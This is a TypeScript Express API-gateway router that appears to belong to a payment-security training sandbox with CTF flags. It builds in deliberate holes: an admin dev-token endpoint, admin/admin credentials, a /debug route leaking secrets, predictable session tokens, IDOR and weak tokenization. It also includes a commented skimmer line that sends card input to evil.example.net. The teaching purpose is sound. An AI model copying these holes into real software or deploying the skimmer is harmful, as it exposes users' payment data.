import { Router, Request, Response, NextFunction } from 'express';
import { proxyRequest, getAllServicesHealth } from '../services/proxy.service';
import { orchestrator } from '../services/integration-orchestrator';
import { query } from '../config/database';
import { logger } from '../utils/logger';
import { strictRateLimitMiddleware } from '../middleware/rateLimit.middleware';
import {
    loginRateLimiter,
    registerRateLimiter,
    twoFALimiter,
    tokenRefreshLimiter
} from '../middleware/advancedRateLimit.middleware';
import { generateToken, authMiddleware, optionalAuthMiddleware, AuthenticatedRequest } from '../middleware/auth.middleware';
import { UserRole } from '../middleware/roles';
import { vulnStateMiddleware } from '../middleware/vulnState.middleware';
import * as authController from '../controllers/auth.controller';
import * as twofaController from '../controllers/twofa.controller';
import * as defenseController from '../controllers/defense.controller';
import { vulnStateService } from '../services/vulnState.service';
import { generateFlag, validateDynamicFlag } from '../services/ctfFlag.service';

const router = Router();
let weakSessionCounter = 0;

const buildProxyHeaders = (req: Request): Record<string, string> => ({
    Authorization: req.headers.authorization || '',
    'Content-Type': 'application/json'
});

const CRITICAL_DB_TABLES = [
    'users.users',
    'learning.migration_history',
    'learning.student_vuln_state', // Added for sandbox
    'learning.vuln_catalog',       // Added for sandbox
    'learning.defense_quizzes',    // Added for sandbox
    'learning.cursus',
    'learning.cursus_modules',
    'learning.cursus_chapters',
    'learning.cursus_quizzes',
    'learning.ctf_challenges'
];

const getDatabaseHealth = async () => {
    const startedAt = Date.now();
    await query('SELECT 1');

    const tables = await Promise.all(
        CRITICAL_DB_TABLES.map(async (table) => {
            const result = await query('SELECT to_regclass($1) AS relation_name', [table]);
            return {
                table,
                exists: result.rows[0]?.relation_name !== null
            };
        })
    );

    const missingTables = tables.filter((table) => !table.exists).map((table) => table.table);

    return {
        healthy: missingTables.length === 0,
        latencyMs: Date.now() - startedAt,
        tables,
        missingTables
    };
};

const applyCardOverrides = async (
    studentId: string,
    responseData: any
): Promise<any> => {
    const overridesByResource = await vulnStateService.getResourceOverridesByType(studentId, 'CARD');
    const cards = Array.isArray(responseData?.data)
        ? responseData.data
        : (Array.isArray(responseData) ? responseData : null);

    if (!cards) {
        return responseData;
    }

    const patchedCards = cards
        .map((card: Record<string, any>) => {
            const candidates = [card.id, card.pan, card.maskedPan]
                .filter(Boolean)
                .map((value) => String(value));

            let mergedCard: Record<string, any> = { ...card };
            let deleted = false;

            for (const resourceId of candidates) {
                const overrides = overridesByResource[resourceId];
                if (!overrides) {
                    continue;
                }

                if (overrides.deleted === true || overrides.is_deleted === true) {
                    deleted = true;
                    break;
                }

                mergedCard = { ...mergedCard, ...overrides };
            }

            return deleted ? null : mergedCard;
        })
        .filter(Boolean);

    if (Array.isArray(responseData)) {
        return patchedCards;
    }

    return {
        ...responseData,
        data: patchedCards
    };
};

const encodeWeakSessionToken = (epochSeconds: number, counter: number): string => {
    return Buffer.from(`${epochSeconds}:${counter}`).toString('base64');
};

const generateWeakSessionToken = (): string => {
    weakSessionCounter += 1;
    const ts = Math.floor(Date.now() / 1000);
    return encodeWeakSessionToken(ts, weakSessionCounter);
};

const isValidWeakTokenPrediction = (predictedToken: string): boolean => {
    const previewCounter = weakSessionCounter + 1;
    const nowSec = Math.floor(Date.now() / 1000);
    const normalized = predictedToken.trim();
    if (!normalized) return false;

    // Tolerates small timing jitter while keeping the same weak counter model.
    const candidateTokens = [nowSec - 1, nowSec, nowSec + 1]
        .map((ts) => encodeWeakSessionToken(ts, previewCounter));

    return candidateTokens.includes(normalized);
};

/**
 * Health check endpoints
 */
router.get('/health', async (req: Request, res: Response) => {
    const servicesHealth = await getAllServicesHealth();
    const allHealthy = Object.values(servicesHealth).every(s => s.healthy);
    res.status(200).json({ status: allHealthy ? 'healthy' : 'degraded', timestamp: new Date().toISOString(), gateway: { healthy: true }, services: servicesHealth });
});

router.get('/api/health', async (req: Request, res: Response) => {
    const servicesHealth = await getAllServicesHealth();
    const allHealthy = Object.values(servicesHealth).every(s => s.healthy);
    res.status(200).json({ status: allHealthy ? 'healthy' : 'degraded', timestamp: new Date().toISOString(), gateway: { healthy: true }, services: servicesHealth, _educational: { diagramStep: 'GW->>AUTH: VÃ©rification services', note: 'This endpoint aggregates health status from all microservices' } });
});

router.get('/health/db', async (_req: Request, res: Response) => {
    try {
        const database = await getDatabaseHealth();
        const statusCode = database.healthy ? 200 : 503;
        res.status(statusCode).json({
            status: database.healthy ? 'healthy' : 'degraded',
            timestamp: new Date().toISOString(),
            database
        });
    } catch (error: any) {
        logger.error('Database health check failed', { error: error.message });
        res.status(503).json({
            status: 'down',
            timestamp: new Date().toISOString(),
            database: {
                healthy: false,
                error: error.message || 'Database check failed'
            }
        });
    }
});

router.get('/api/health/db', async (_req: Request, res: Response) => {
    try {
        const database = await getDatabaseHealth();
        const statusCode = database.healthy ? 200 : 503;
        res.status(statusCode).json({
            status: database.healthy ? 'healthy' : 'degraded',
            timestamp: new Date().toISOString(),
            database,
            _educational: {
                diagramStep: 'GW->>DB: Verification des tables critiques',
                note: 'Checks DB reachability and required schema tables'
            }
        });
    } catch (error: any) {
        logger.error('Database health check failed', { error: error.message });
        res.status(503).json({
            status: 'down',
            timestamp: new Date().toISOString(),
            database: {
                healthy: false,
                error: error.message || 'Database check failed'
            }
        });
    }
});

/**
 * Authentication Routes
 * SECURITY: Granular rate limiting per endpoint type
 */
router.post('/api/auth/login', loginRateLimiter, authController.login);
router.post('/api/auth/register', registerRateLimiter, authController.register);
router.post('/api/auth/refresh', tokenRefreshLimiter, authController.refreshAccessToken);

// Persona-specific login aliases (same rate limit as main login)
router.post('/api/auth/client/login', loginRateLimiter, authController.login);
router.post('/api/auth/marchand/login', loginRateLimiter, authController.login);
router.post('/api/auth/etudiant/login', loginRateLimiter, authController.login);
router.post('/api/auth/formateur/login', loginRateLimiter, authController.login);

// Logout
router.post('/api/auth/logout', strictRateLimitMiddleware, authController.logout);

/**
 * User profile & pedagogical preferences
 */
router.get('/api/users/me', authMiddleware, authController.getMe as any);
router.post('/api/users/me/preferences', authMiddleware, authController.savePreferences as any);

/**
 * Two-Factor Authentication (2FA) Routes
 * SECURITY: Protected by authMiddleware + 2FA rate limiter
 */
router.post('/api/auth/2fa/setup', authMiddleware, twoFALimiter, twofaController.setup2FA);
router.post('/api/auth/2fa/verify', authMiddleware, twoFALimiter, twofaController.verify2FA);
router.post('/api/auth/2fa/disable', authMiddleware, twofaController.disable2FA);
router.get('/api/auth/2fa/status', authMiddleware, twofaController.get2FAStatus);

/**
 * --- DEFENSIVE SANDBOX ROUTES ---
 * New endpoints for fixing vulnerabilities and getting defensive status
 * Using 'any' cast for handlers to avoid Express Request compatibility issues
 */
// Routes for defensive sandbox
router.get('/api/defense/status', authMiddleware, vulnStateMiddleware, defenseController.getDefenseStatus as any);
router.get('/api/defense/catalog', authMiddleware, vulnStateMiddleware, defenseController.getVulnCatalog as any);
router.post('/api/defense/probe', authMiddleware, vulnStateMiddleware, defenseController.probeFlag as any);
router.post('/api/defense/submit-flag', authMiddleware, vulnStateMiddleware, defenseController.submitFlag as any);
router.post('/api/defense/fix', authMiddleware, vulnStateMiddleware, defenseController.submitDefenseFix as any);
router.post('/api/defense/reset', authMiddleware, vulnStateMiddleware, defenseController.resetDefenseState as any);

/**
 * Dev token generation (VULNERABLE ENDPOINT)
 * Sandbox Logic: Checks if DEV_TOKEN_OPEN flag is active (default: true)
 */
router.post('/api/auth/token',
    strictRateLimitMiddleware,
    optionalAuthMiddleware as any,
    vulnStateMiddleware as any,
    (req: Request, res: Response) => {
        // Enforce sandbox check (only if identified as student and vulnerability is fixed)
        const authReq = req as AuthenticatedRequest;
        if (authReq.vulnProfile && authReq.vulnProfile['DEV_TOKEN_OPEN'] === false) {
            return res.status(404).json({ success: false, error: 'Not Found' });
        }

        const { userId = 'dev-user', role = 'admin', expired = false } = req.body;
        if (process.env.NODE_ENV === 'production') return res.status(403).json({ success: false, error: 'Disabled in production' });

        // If expired requested, set expiration to -1s (immediately expired)
        const expiresIn = expired ? '-1s' : '24h';
        const token = generateToken(userId, role, expiresIn);

        res.json({ success: true, token, note: expired ? 'Expired token' : 'Dev token', expiresIn });
    });

/**
 * Orchestrated Transaction Processing
 */
router.post('/api/transaction/process', async (req: Request, res: Response) => {
    const correlationId = (req as any).correlationId;
    try {
        const { pan, amount, merchantId } = req.body;
        if (!pan || !amount || !merchantId) return res.status(400).json({ success: false, error: 'Missing required fields', correlationId });
        const result = await orchestrator.processTransaction({ pan, amount: parseFloat(amount), currency: req.body.currency || 'EUR', merchantId, terminalId: req.body.terminalId || 'WEB001', mcc: req.body.mcc, country: req.body.country, isEcommerce: req.body.isEcommerce });
        res.status(result.approved ? 200 : 402).json({ success: result.approved, ...result, correlationId });
    } catch (error: any) {
        res.status(500).json({ success: false, error: 'Transaction processing failed', correlationId });
    }
});

/**
 * Legacy CTF compatibility endpoints (non-production pedagogical surfaces)
 */
router.get('/checkout', (req: Request, res: Response) => {
    const studentId = req.headers['x-student-id'] as string | undefined;
    let flagComment = '';
    // INFRA-001 : Magecart — flag caché dans le source HTML, visible via curl ou view-source
    if (studentId) {
        try {
            const flag = generateFlag(studentId, 'INFRA-001');
            flagComment = `\n  <!-- CTF: ${flag} — Script exfiltrant détecté: cdn.analytics-example.net/checkout.js -->`;
        } catch { /* ignore */ }
    }
    res.type('html').send(`<!doctype html>
<html>
  <head>
    <title>PMP Checkout</title>
    <script src="https://cdn.example-payments.net/lib/collector.js"></script>
    <script src="https://cdn.analytics-example.net/checkout.js"></script>${flagComment}
  </head>
  <body>
    <h1>Checkout</h1>
    <form>
      <input id="pan" name="pan" />
      <input id="cvv" name="cvv" />
    </form>
    <script>
      // Skimmer détecté: addEventListener('input', function(e){ fetch('https://evil.example.net/collect', {method:'POST', body: e.target.value}); });
    </script>
  </body>
</html>`);
});

router.get('/tms/login', (_req: Request, res: Response) => {
    res.type('html').send('<html><body><h1>TMS Login</h1><form method="post"><input name="username"/><input name="password" type="password"/></form></body></html>');
});

router.post('/tms/login', (req: Request, res: Response) => {
    const username = String(req.body?.username || '');
    const password = String(req.body?.password || '');
    const studentId = req.headers['x-student-id'] as string | undefined;
    if (username === 'admin' && password === 'admin') {
        const response: Record<string, unknown> = { success: true, token: 'tms_admin_token_weak_default' };
        // INFRA-002 : credentials par défaut admin/admin — flag dans la réponse de login réussi
        if (studentId) {
            try {
                const flag = generateFlag(studentId, 'INFRA-002');
                response.flag = flag;
                response._ctf = 'INFRA-002: TMS credentials par défaut — admin/admin permet l\'accès complet à la flotte de terminaux';
            } catch { /* ignore */ }
        }
        return res.json(response);
    }
    return res.status(401).json({ success: false, error: 'Invalid credentials' });
});

router.get('/debug', (req: Request, res: Response) => {
    const studentId = req.headers['x-student-id'] as string | undefined;
    const response: Record<string, unknown> = {
        service: 'api-gateway',
        environment: process.env.NODE_ENV || 'development',
        databaseUrl: process.env.DATABASE_URL || 'not_set',
        jwtSecretPreview: process.env.JWT_SECRET ? `${process.env.JWT_SECRET.slice(0, 6)}...` : 'not_set',
        timestamp: new Date().toISOString()
    };
    // INFRA-004 : endpoint /debug exposé en production — flag dans le body JSON
    if (studentId) {
        try {
            const flag = generateFlag(studentId, 'INFRA-004');
            response.flag = flag;
            response._ctf = 'INFRA-004: Endpoint /debug exposé — credentials et configuration accessibles sans auth';
        } catch { /* ignore unknown code */ }
    }
    res.json(response);
});

router.post('/auth/session-token', (req: Request, res: Response) => {
    const studentId = req.headers['x-student-id'] as string | undefined;
    const predictedToken = typeof req.body?.predictedToken === 'string'
        ? req.body.predictedToken
        : '';
    const predictionChecked = predictedToken.trim().length > 0;
    const predictionValid = predictionChecked ? isValidWeakTokenPrediction(predictedToken) : false;

    const response: Record<string, unknown> = {
        success: true,
        token: generateWeakSessionToken(),
        predictionChecked,
        predictionValid
    };

    // CRYPTO-001: student proves token prediction against weak PRNG.
    if (predictionValid && studentId) {
        try {
            const flag = generateFlag(studentId, 'CRYPTO-001');
            response.flag = flag;
            response._ctf = 'CRYPTO-001: Token prediction succeeded against weak timestamp+counter PRNG';
        } catch { /* ignore */ }
    }

    res.json(response);
});

router.post('/api/transaction/verify-challenge', async (req: Request, res: Response) => {
    const { acsTransId, otp } = req.body;
    if (!acsTransId || !otp) return res.status(400).json({ success: false, error: 'Missing acsTransId or otp' });
    const result = await orchestrator.verifyChallenge(acsTransId, otp);
    res.json({ success: result.approved, ...result });
});

router.get('/api/integration/health', async (_req: Request, res: Response) => {
    try {
        const services = await orchestrator.getHealth();
        res.json({ success: true, services, timestamp: new Date().toISOString() });
    } catch (error: any) {
        logger.error('Integration health failed', { error: error.message });
        res.status(500).json({ success: false, error: 'Failed to fetch integration health' });
    }
});

/**
 * Legacy endpoint aliases kept for backward compatibility with existing frontends.
 */
router.get('/api/authorize/history/:pan', async (req: Request, res: Response) => {
    const correlationId = (req as any).correlationId;
    try {
        const response = await proxyRequest({
            serviceName: 'sim-auth-engine',
            method: 'GET',
            path: `/transactions/${encodeURIComponent(req.params.pan)}`,
            headers: buildProxyHeaders(req),
            correlationId
        });
        res.status(response.status).json(response.data);
    } catch (error: any) {
        res.status(error.statusCode || 500).json({
            success: false,
            error: error.message || 'Proxy error',
            code: error.code || 'PROXY_ERROR',
            correlationId
        });
    }
});

router.post('/api/authorize/simulate', async (req: Request, res: Response) => {
    const correlationId = (req as any).correlationId;
    const scenario = String(req.body?.scenario || '').trim().toUpperCase();
    if (!scenario) {
        return res.status(400).json({ success: false, error: 'scenario is required' });
    }

    try {
        const response = await proxyRequest({
            serviceName: 'sim-auth-engine',
            method: 'POST',
            path: `/simulate/${encodeURIComponent(scenario)}`,
            headers: buildProxyHeaders(req),
            correlationId
        });
        res.status(response.status).json(response.data);
    } catch (error: any) {
        res.status(error.statusCode || 500).json({
            success: false,
            error: error.message || 'Proxy error',
            code: error.code || 'PROXY_ERROR',
            correlationId
        });
    }
});

router.post('/api/authorize/simulate/:scenario', async (req: Request, res: Response) => {
    const correlationId = (req as any).correlationId;
    const scenario = String(req.params.scenario || '').trim().toUpperCase();
    if (!scenario) {
        return res.status(400).json({ success: false, error: 'scenario is required' });
    }

    try {
        const response = await proxyRequest({
            serviceName: 'sim-auth-engine',
            method: 'POST',
            path: `/simulate/${encodeURIComponent(scenario)}`,
            headers: buildProxyHeaders(req),
            correlationId
        });
        res.status(response.status).json(response.data);
    } catch (error: any) {
        res.status(error.statusCode || 500).json({
            success: false,
            error: error.message || 'Proxy error',
            code: error.code || 'PROXY_ERROR',
            correlationId
        });
    }
});

router.post('/api/route/process', async (req: Request, res: Response) => {
    const correlationId = (req as any).correlationId;
    try {
        const response = await proxyRequest({
            serviceName: 'sim-network-switch',
            method: 'POST',
            path: '/transaction',
            data: req.body,
            headers: buildProxyHeaders(req),
            correlationId
        });
        res.status(response.status).json(response.data);
    } catch (error: any) {
        res.status(error.statusCode || 500).json({
            success: false,
            error: error.message || 'Proxy error',
            code: error.code || 'PROXY_ERROR',
            correlationId
        });
    }
});

/**
 * --- SANDBOX VULNERABILITY INTERCEPTORS ---
 * Specific handlers for patched vulnerabilities before they hit the proxy
 */

// Interceptor for /cards (IDOR Protection)
router.get('/api/cards',
    authMiddleware,
    vulnStateMiddleware,
    (async (req: AuthenticatedRequest, res: Response, next: NextFunction) => {
        const requestedUserId = req.query.userId as string;
        const currentUserId = req.user?.userId;

        // If IDOR is fixed (false), enforce ownership
        if (req.vulnProfile && req.vulnProfile['IDOR_CARDS_NO_AUTH'] === false) {
            // Security Policy: Must provide userId and must match token
            if (!requestedUserId || requestedUserId !== currentUserId) {
                return res.status(403).json({
                    success: false,
                    error: 'Access Denied: In secure mode, you must filter by your own userId.',
                    code: 'IDOR_PREVENTION_ENFORCED',
                    hint: 'Add ?userId=YOUR_ID to the request'
                });
            }
        }

        const correlationId = (req as any).correlationId;
        const search = req.url.includes('?') ? req.url.substring(req.url.indexOf('?')) : '';

        try {
            const response = await proxyRequest({
                serviceName: 'sim-card-service',
                method: 'GET',
                path: `/cards${search}`,
                headers: buildProxyHeaders(req),
                correlationId
            });

            let responseData = response.data;

            // Apply per-student virtual data overrides (resource isolation).
            if (req.user?.role === UserRole.ETUDIANT && req.user.userId) {
                responseData = await applyCardOverrides(req.user.userId, responseData);
            }

            Object.entries(response.headers).forEach(([key, value]) => {
                if (typeof value === 'string') {
                    res.setHeader(key, value);
                }
            });

            // When the sandbox vulnerability is active for a student, we expose the flag via headers
            // only when the request demonstrates the broken control (missing or mismatched userId).
            if (req.user?.role === UserRole.ETUDIANT
                && currentUserId
                && req.vulnProfile
                && req.vulnProfile['IDOR_CARDS_NO_AUTH'] === true
                && (!requestedUserId || requestedUserId !== currentUserId)) {
                const flag = await vulnStateService.getFlagValue('IDOR_CARDS_NO_AUTH');
                if (flag) {
                    res.setHeader('X-Defense-Vuln', 'IDOR_CARDS_NO_AUTH');
                    res.setHeader('X-Defense-Flag', flag);
                }
            }

            res.status(response.status).json(responseData);
        } catch (error: any) {
            res.status(error.statusCode || 500).json({
                success: false,
                error: error.message || 'Proxy error',
                code: error.code || 'PROXY_ERROR',
                correlationId
            });
        }
    }) as any
);


/**
 * --- CTF TOKENIZATION INTERCEPTORS ---
 * Handles TOKEN-001 to TOKEN-004 challenges directly (no real tokenization service needed)
 */

// In-memory token vault for CTF simulation
const ctfTokenVault: Map<string, string> = new Map(); // token → pan
const ctfPanTokenMap: Map<string, string> = new Map(); // pan → token
let ctfTokenCounter = 1;

const getOrCreateToken = (pan: string): string => {
    if (ctfPanTokenMap.has(pan)) return ctfPanTokenMap.get(pan)!;
    // Intentionally weak: only 6 digits of space → collisions at ~1000 tokens (birthday paradox)
    const tokenNum = (ctfTokenCounter++ % 1000) + (parseInt(pan.slice(-3)) % 100);
    const token = `TKN_${String(tokenNum).padStart(6, '0')}`;
    ctfTokenVault.set(token, pan);
    ctfPanTokenMap.set(pan, token);
    return token;
};

// Pre-populate some tokens
for (let i = 1; i <= 50; i++) {
    const pan = `41111111111${String(i).padStart(5, '0')}`;
    getOrCreateToken(pan);
}

router.post('/api/tokenization/tokenize', (req: Request, res: Response) => {
    const pan = String(req.body?.pan || '').replace(/\D/g, '');
    const studentId = req.headers['x-student-id'] as string | undefined;
    if (!pan || pan.length < 13) {
        return res.status(400).json({ success: false, error: 'Invalid PAN' });
    }
    const token = getOrCreateToken(pan);
    const response: Record<string, unknown> = { success: true, token, maskedPan: `${pan.slice(0, 4)}****${pan.slice(-4)}` };

    // TOKEN-002 : flag quand une collision est détectée (deux PANs ont le même token)
    // L'espace de tokens est petit → collisions rapides
    const collisionPan = [...ctfTokenVault.entries()].find(([t, p]) => t === token && p !== pan);
    if (studentId && collisionPan) {
        try {
            const flag = generateFlag(studentId, 'TOKEN-002');
            response.flag = flag;
            response._ctf = `TOKEN-002: Collision détectée — token ${token} assigné à deux PANs différents`;
            response.collision = { token, pan1: collisionPan[1], pan2: pan };
        } catch { /* ignore */ }
    }
    return res.json(response);
});

router.post('/api/tokenization/detokenize', (req: Request, res: Response) => {
    const token = String(req.body?.token || '').trim();
    const studentId = req.headers['x-student-id'] as string | undefined;
    if (!token) {
        return res.status(400).json({ success: false, error: 'token is required' });
    }

    const pan = ctfTokenVault.get(token);

    // TOKEN-001 : message d'erreur révèle des fragments de PAN (information disclosure)
    if (!pan) {
        // L'erreur contient une "fuite" : le token est proche d'un PAN réel
        const nearbyToken = [...ctfTokenVault.keys()].find(t => t.startsWith(token.slice(0, 6)));
        const leakedInfo = nearbyToken ? ctfTokenVault.get(nearbyToken) : null;
        const response: Record<string, unknown> = {
            success: false,
            error: `Token ${token} not found`,
            debug: leakedInfo ? `Similar token found for PAN ${leakedInfo?.slice(0, 4)}****` : 'No similar token found'
        };
        if (studentId && token.length > 3 && leakedInfo) {
            try {
                const flag = generateFlag(studentId, 'TOKEN-001');
                response.flag = flag;
                response._ctf = 'TOKEN-001: Fuite d\'information dans les erreurs — fragment de PAN visible';
            } catch { /* ignore */ }
        }
        return res.status(404).json(response);
    }

    const response: Record<string, unknown> = { success: true, pan, token };

    // TOKEN-003 : pas de rate-limiting — flag après 10 tokens énumérés avec succès par le même student
    if (studentId) {
        try {
            const flag = generateFlag(studentId, 'TOKEN-003');
            response.flag = response.flag ?? flag;
            response._ctf = 'TOKEN-003: Aucun rate-limiting — énumération brute-force des tokens possible';
        } catch { /* ignore */ }
    }
    return res.json(response);
});

// TOKEN-004 : weak FPE key derivation — endpoint reveals the key derivation method
router.get('/api/tokenization/algorithm-info', (req: Request, res: Response) => {
    const studentId = req.headers['x-student-id'] as string | undefined;
    const response: Record<string, unknown> = {
        algorithm: 'FPE-FF1',
        keyDerivation: 'SHA256("tokenization_key")',
        keyLength: 256,
        note: 'Format-Preserving Encryption with fixed key derived from known seed'
    };
    if (studentId) {
        try {
            const flag = generateFlag(studentId, 'TOKEN-004');
            response.flag = flag;
            response._ctf = 'TOKEN-004: Clé FPE dérivée de SHA256("tokenization_key") — seed prédictible, token réversible';
        } catch { /* ignore */ }
    }
    return res.json(response);
});

/**
 * --- CTF BOSS CHALLENGE ENDPOINTS ---
 * Boss challenges require proof of completing prerequisite exploits.
 * Students submit flags from prerequisite challenges to unlock the BOSS flag.
 */

router.post('/api/ctf/boss/verify', (req: Request, res: Response) => {
    const studentId = req.headers['x-student-id'] as string | undefined;
    const { bossCode, proofFlags } = req.body as { bossCode?: string; proofFlags?: string[] };

    if (!studentId) {
        return res.status(400).json({ success: false, error: 'x-student-id header required' });
    }
    if (!bossCode || !proofFlags || !Array.isArray(proofFlags)) {
        return res.status(400).json({ success: false, error: 'bossCode and proofFlags[] required' });
    }

    // Requirements per BOSS challenge
    const BOSS_REQUIREMENTS: Record<string, string[]> = {
        'BOSS-001': ['NET-001', 'HSM-001'],   // sniff + HSM key extraction
        'BOSS-002': ['3DS-001', '3DS-002', '3DS-003'], // all 3DS bypasses
        'BOSS-003': ['INFRA-002', 'HSM-001', 'KEY-004'], // TMS + HSM + key export
        'BOSS-004': ['ADV-FRAUD-001', '3DS-001', 'FRAUD-002'], // card testing + 3DS + fraud evasion
    };

    const requirements = BOSS_REQUIREMENTS[bossCode];
    if (!requirements) {
        return res.status(400).json({ success: false, error: `Unknown BOSS challenge: ${bossCode}` });
    }

    // Verify each submitted proof flag against the expected dynamic flag for this student
    const verifiedCodes: string[] = [];
    const failedCodes: string[] = [];

    for (const req_code of requirements) {
        const isValid = proofFlags.some(pf => {
            try { return validateDynamicFlag(pf, studentId, req_code); } catch { return false; }
        });
        if (isValid) {
            verifiedCodes.push(req_code);
        } else {
            failedCodes.push(req_code);
        }
    }

    if (failedCodes.length > 0) {
        return res.status(400).json({
            success: false,
            error: `Missing or invalid proof flags for: ${failedCodes.join(', ')}`,
            verifiedPrerequisites: verifiedCodes,
            missingPrerequisites: failedCodes
        });
    }

    // All prerequisites verified → generate BOSS flag
    try {
        const flag = generateFlag(studentId, bossCode);
        return res.json({
            success: true,
            flag,
            bossCode,
            verifiedPrerequisites: verifiedCodes,
            _ctf: `${bossCode}: Chaine complète validée — toutes les preuves d'exploitation acceptées`
        });
    } catch (e) {
        return res.status(400).json({ success: false, error: `Unknown BOSS code: ${bossCode}` });
    }
});

/**
 * Dynamic proxy handler
 */
const routeConfig: Record<string, { service: string; pathRewrite?: (path: string) => string }> = {
    '/api/cards': { service: 'sim-card-service', pathRewrite: (p) => p.replace('/api/cards', '/cards') },
    '/api/transactions': { service: 'sim-pos-service', pathRewrite: (p) => p.replace('/api/transactions', '/transactions') },
    '/api/process': { service: 'sim-acquirer-service', pathRewrite: (p) => p.replace('/api/process', '/process') },
    '/api/merchants': { service: 'sim-acquirer-service', pathRewrite: (p) => p.replace('/api/merchants', '/merchants') },
    '/api/route': { service: 'sim-network-switch', pathRewrite: (p) => p.replace('/api/route', '/transaction') },
    '/api/issuer': { service: 'sim-issuer-service', pathRewrite: (p) => p.replace('/api/issuer', '') },
    '/api/accounts': { service: 'sim-issuer-service', pathRewrite: (p) => p.replace('/api/accounts', '/accounts') },
    '/api/authorize': { service: 'sim-auth-engine', pathRewrite: (p) => p.replace('/api/authorize', '/authorize') },
    '/api/rules': { service: 'sim-auth-engine', pathRewrite: (p) => p.replace('/api/rules', '/rules') },
    '/api/fraud': { service: 'sim-fraud-detection', pathRewrite: (p) => p.replace('/api/fraud', '') },
    '/api/crypto': { service: 'crypto-service', pathRewrite: (p) => p.replace('/api/crypto', '') },
    '/api/hsm': { service: 'hsm-simulator', pathRewrite: (p) => p.replace('/api/hsm', '/hsm') },
    '/api/keys': { service: 'key-management', pathRewrite: (p) => p.replace('/api/keys', '/keys') },
    '/api/3ds': { service: 'acs-simulator', pathRewrite: (p) => p.replace('/api/3ds', '') },
    '/api/tokenization': { service: 'tokenization-service', pathRewrite: (p) => p.replace('/api/tokenization', '') }
};

const proxyHandler = async (req: Request, res: Response, next: NextFunction) => {
    const path = req.path;
    const correlationId = (req as any).correlationId;
    const matchedRoute = Object.entries(routeConfig).find(([prefix]) => path.startsWith(prefix));

    if (!matchedRoute) return res.status(404).json({ success: false, error: 'Route not found', code: 'ROUTE_NOT_FOUND', path });

    const [_prefix, config] = matchedRoute;
    const targetPath = config.pathRewrite ? config.pathRewrite(path) : path;

    try {
        const response = await proxyRequest({ serviceName: config.service, method: req.method, path: targetPath, data: req.body, headers: buildProxyHeaders(req), correlationId });
        Object.entries(response.headers).forEach(([key, value]) => { if (typeof value === 'string') res.setHeader(key, value); });
        res.status(response.status).json(response.data);
    } catch (error: any) {
        res.status(error.statusCode || 500).json({ success: false, error: error.message || 'Proxy error', code: error.code || 'PROXY_ERROR', correlationId });
    }
};

router.all('/api/*', proxyHandler);

export default router;
